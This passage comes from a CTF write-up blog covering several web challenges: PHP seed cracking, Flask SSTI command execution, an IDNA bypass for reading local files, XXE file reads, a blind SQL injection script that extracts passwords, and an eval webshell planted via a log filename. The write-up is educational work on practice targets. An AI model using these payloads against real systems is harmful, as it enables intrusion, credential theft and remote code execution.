class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-04" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-04</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 22.41.58.png)</p><p>跑出来一个尝试一下</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php#version:php7.3.4mt_srand(830361885);$str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str&#x3D;&#39;&#39;;$len1&#x3D;20;for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123;    $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       &#125;echo $str;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功</p>        <h2 id="CSCCTF-2019-Qual-FlaskLight"   >          <a href="#CSCCTF-2019-Qual-FlaskLight" class="heading-link"><i class="fas fa-link"></i></a><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2>      <p>SSTI</p><p>config里面有提示</p><pre class="line-numbers language-none"><code class="language-none">&#39;SECRET_KEY&#39;: &#39;CCC&#123;f4k3_Fl49_:v&#125; CCC&#123;the_flag_is_this_dir&#125;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>构造读文件的类咯</p><pre class="line-numbers language-none"><code class="language-none">search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[-1].__subclasses__()&#125;&#125;里面有&lt;class &#39;subprocess.Popen&#39;&gt;，在258位<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">payload:search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[-1].__subclasses__()[258](&#39;cat flasklight&#x2F;coomme_geeeett_youur_flek&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="SUCTF-2019-Pythonginx"   >          <a href="#SUCTF-2019-Pythonginx" class="heading-link"><i class="fas fa-link"></i></a><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2>      <p>进入就是源码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/getUrl'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span>    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname <span class="token comment">#解析出主机名</span>    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"我扌 your problem? 111"</span>    parts <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>urlsplit<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>    host <span class="token operator">=</span> parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token comment">#再次解析主机名</span>    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"我扌 your problem? 222 "</span> <span class="token operator">+</span> host    newhost <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> h <span class="token keyword">in</span> host<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#对www.example.com按.划分，先按idna编码，再utf-8解码</span>        newhost<span class="token punctuation">.</span>append<span class="token punctuation">(</span>h<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'idna'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>newhost<span class="token punctuation">)</span> <span class="token comment">#组合好解码后的主机名</span>    <span class="token comment">#去掉 url 中的空格</span>    finalUrl <span class="token operator">=</span> urlunsplit<span class="token punctuation">(</span>parts<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname <span class="token comment">#解析出主机名，要等于suctf.cc</span>    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"我扌 your problem? 333"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>搞个脚本尝试跑出最后的c中以idna编码后再经过utf8编码结果为C的内容</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">65537</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> tmp<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'idna'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> res<span class="token operator">==</span><span class="token string">"c"</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果：</p><pre class="line-numbers language-none"><code class="language-none">ℂℭⅭⅽⒸⓒＣｃ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>随便拎一个构造payload，题中提示了使用了nginx，尝试访问默认nginx配置文件</p><pre class="line-numbers language-none"><code class="language-none">配置文件存放目录：&#x2F;etc&#x2F;nginx主要配置文件：&#x2F;etc&#x2F;nginx&#x2F;conf&#x2F;nginx.conf管理脚本：&#x2F;usr&#x2F;lib64&#x2F;systemd&#x2F;system&#x2F;nginx.service模块：&#x2F;usr&#x2F;lisb64&#x2F;nginx&#x2F;modules应用程序：&#x2F;usr&#x2F;sbin&#x2F;nginx程序默认存放位置：&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html日志默认存放位置：&#x2F;var&#x2F;log&#x2F;nginxNginx配置文件：&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">file:&#x2F;&#x2F;suctf.cℂ&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">server &#123;    listen 80;    location &#x2F; &#123;        try_files $uri @app;    &#125;    location @app &#123;        include uwsgi_params;        uwsgi_pass unix:&#x2F;&#x2F;&#x2F;tmp&#x2F;uwsgi.sock;    &#125;    location &#x2F;static &#123;        alias &#x2F;app&#x2F;static;    &#125;    # location &#x2F;flag &#123;    #     alias &#x2F;usr&#x2F;fffffflag;    # &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看flag即可</p><pre class="line-numbers language-none"><code class="language-none">file:&#x2F;&#x2F;suctf.cℂ&#x2F;usr&#x2F;fffffflag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="NCTF2019-True-XML-cookbook"   >          <a href="#NCTF2019-True-XML-cookbook" class="heading-link"><i class="fas fa-link"></i></a><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2>      <p>又一个XXE，先尝试一下直接读flag吧</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">a</span> <span class="token punctuation">[</span><span class="token internal-subset"> &lt;!ENTITY abc SYSTEM "file:///flag"> </span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&abc;">&amp;abc;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>123456<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>emmmmmm文件似乎不存在，再尝试读取网站源码，返回0没有内容，再试试PHP伪协议</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">a</span> <span class="token punctuation">[</span><span class="token internal-subset"> &lt;!ENTITY abc SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php"> </span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&abc;">&amp;abc;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>123456<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*** autor: c0ny1* date: 2018-2-7*/</span><span class="token variable">$USERNAME</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span> <span class="token comment">//账号</span><span class="token variable">$PASSWORD</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'024b87931a03f738fff6693ce0a78c88'</span><span class="token punctuation">;</span> <span class="token comment">//密码</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span><span class="token punctuation">&#123;</span><span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token variable">$USERNAME</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">==</span> <span class="token variable">$PASSWORD</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这玩楞也妹啥用啊</p><p>看看wp，拓展XXE漏洞，可以利用任意文件读取的特性来探测内网存活主机，获取/etc/hosts文件，我们分别读取关键文件：**/etc/hosts 和 /proc/net/arp：**</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">a</span> <span class="token punctuation">[</span><span class="token internal-subset"> &lt;!ENTITY abc SYSTEM "file:///etc/hosts"> </span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&abc;">&amp;abc;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>123456<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-05" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-05</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 19.29.23.png)</p><p>找到内网中IP，尝试在ip末尾爆破，出flag</p><p><del>也不知道我这个环境有啥问题就是跑不出来，以后再试试</del></p>        <h2 id="CISCN2019-总决赛-Day2-Web1-Easyweb"   >          <a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="heading-link"><i class="fas fa-link"></i></a><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h2>      <p>robots.txt</p><pre class="line-numbers language-none"><code class="language-none">Disallow: *.php.bak<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到image.php源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\\0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"%00"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\\'"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\\0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"%00"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\\'"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"select * from images where id='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$id</span><span class="token punctuation">&#125;</span></span>' or path='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$path</span><span class="token punctuation">&#125;</span></span>'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">,</span><span class="token constant">MYSQLI_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token string double-quoted-string">"./"</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: image/jpeg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看源码，发现传入的id和path都将变量经过addslashes转换后的<code>\0,%00,\&#39;,&#39;</code>替换为空</p><p>那么我们如果传入\\0，前两个反斜杠由于转义，结果是\0，经过addslashes变为\\0，再经过str_replace变为\，此时整个sql语句变为</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from images where id&#x3D;&#39;\&#39; or path&#x3D;&#39;&#123;$path&#125;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们就可以在path处进行sql注入</p><pre class="line-numbers language-none"><code class="language-none">tables:images,users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">r"http://3658d7dc-a0eb-4cb0-a891-f66217ffe401.node4.buuoj.cn:81/image.php?id=\\0&amp;path=or id="</span>name<span class="token operator">=</span><span class="token string">'admin1234567890,qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> name<span class="token punctuation">:</span>        payload<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"if((ascii(substr((select group_concat(password)from users),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">),1,0)--+"</span></span>        tex<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">"JFIF"</span> <span class="token keyword">in</span> tex<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在users表中获得用户名和密码<code>admin:157aeccdaba2cf3324cf</code></p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-06" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-06</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 21.43.40.png)</p><p>尝试上传一句话木马，显示不允许上传php文件，上传任意文件尝试，得到提示</p><pre class="line-numbers language-none"><code class="language-none">I logged the file name you uploaded to logs&#x2F;upload.b6acf587d3c1a6ea213bf45c8c143b95.log.php.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将文件名写入log.php文件，在文件名处尝试构造木马，还是提示不能上传，看来在文件名处对php进行了过滤，尝试短标签绕过成功</p><pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D; eval($_POST[&#39;kkk&#39;]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿flag</p>        <h2 id="RCTF2015-EasySQL"   >          <a href="#RCTF2015-EasySQL" class="heading-link"><i class="fas fa-link"></i></a><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2>      <p>进入页面发现有一个登录一个注册，怀疑是二次注入，尝试在用户名中加入单双引号测试，注册成功但是登录失败，看看wp，使用反斜杠进行测试，在修改密码处测试成功，报错回显</p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-06" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-06</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 21.58.42.png)</p>        <h2 id="HITCON-2017-SSRFme"   >          <a href="#HITCON-2017-SSRFme" class="heading-link"><i class="fas fa-link"></i></a><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h2>      <pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php    if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123;        $http_x_headers &#x3D; explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);        $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D; $http_x_headers[0];    &#125;    echo $_SERVER[&quot;REMOTE_ADDR&quot;];    $sandbox &#x3D; &quot;sandbox&#x2F;&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);    @mkdir($sandbox);    @chdir($sandbox);    $data &#x3D; shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));    $info &#x3D; pathinfo($_GET[&quot;filename&quot;]);    $dir  &#x3D; str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));    @mkdir($dir);    @chdir($dir);    @file_put_contents(basename($info[&quot;basename&quot;]), $data);    highlight_file(__FILE__);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>两眼一蒙，直接<span class="exturl"><a class="exturl__link"   href="https://blog.csdn.net/qq_49422880/article/details/121430262" >wp</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，是新知识耶</p><blockquote><p>题目的意思是先以MD5(orange .ip)生成一个hash,放在sandbox之下，然后使用GET命令进行访问，那里就可以使用perl 进行命令执行，执行的前提是 前面必须要创建一个和这个命令一样的文件。然后呢就是将命令执行的结果放到我们传进去的文件里面。</p></blockquote><p>先看看根目录下有什么</p><pre class="line-numbers 